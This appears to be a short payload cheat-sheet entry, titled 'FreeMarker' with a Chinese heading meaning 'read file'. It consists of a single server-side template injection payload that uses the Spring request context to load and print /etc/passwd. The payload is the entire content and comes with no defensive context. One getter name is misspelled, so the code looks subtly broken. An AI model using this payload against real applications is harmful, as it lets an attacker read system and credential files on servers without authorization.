# FreeMarker

读文件
```
[#assign ctx=springMacroRequestContext.webApplocationContext/]
[#assign url=ctx.getResource('file:///etc/passwd')/]
[#assign is = url.getInputStream()/]
[#list 1..url.contentLength() as i]${is.read()}[/#list]
```
